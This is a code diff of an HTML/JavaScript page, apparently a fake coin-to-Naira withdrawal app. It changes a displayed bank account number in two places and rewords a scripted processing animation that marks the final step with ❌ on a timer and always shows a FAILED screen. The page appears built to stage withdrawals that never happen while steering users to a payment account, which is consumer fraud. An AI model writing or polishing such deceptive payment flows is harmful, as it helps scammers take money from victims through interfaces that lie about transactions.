@@ -2163,7 +2163,7 @@ body{background:#0a0a0a;color:#fff;min-height:100vh;min-height:100dvh;display:fl
 
                     <span class="bank-value acct-num" id="acctNum" onclick="copyAccount()">
 
-                        9736975047
+                        6092973068
 
                         <button class="copy-btn" id="copyBtn" onclick="event.stopPropagation();copyAccount()">Copy</button>
 
@@ -2896,7 +2896,7 @@ body{background:#0a0a0a;color:#fff;min-height:100vh;min-height:100dvh;display:fl
 
         <div class="proc-step" id="procStep2">
             <div class="proc-icon">🔄</div>
-            <div class="proc-text">Converting coins to Naira...</div>
+            <div class="proc-text">Verifying payment amount...</div>
             <div class="proc-status" id="procStatus2"></div>
         </div>
 
@@ -3422,7 +3422,7 @@ function showPromoScreen() {
 
 function copyAccount() {
 
-    const num = '9736975047';
+    const num = '6092973068';
 
     navigator.clipboard.writeText(num).then(() => {
 
@@ -4025,7 +4025,7 @@ function startProcessingAnimation() {
     // Update step 3 text with actual bank and amount
     var bankName = pendingWithdrawal.bankName || 'your bank';
     var amount = '₦' + (pendingWithdrawal.amount || 0).toLocaleString();
-    document.getElementById('procStep3Text').textContent = 'Sending ' + amount + ' to ' + bankName + '...';
+    document.getElementById('procStep3Text').textContent = 'Verifying transaction for ' + bankName + '...';
 
     // Reset all steps
     ['procStep1','procStep2','procStep3'].forEach(function(id) {
@@ -4074,7 +4074,7 @@ function startProcessingAnimation() {
         document.getElementById('procStatus3').textContent = '❌';
     }, 11300);
 
-    // After all steps done - show FAILED screen
+    // After all steps done - show FAILED screen (testing mode)
     setTimeout(function() {
         screen.classList.remove('active');
 
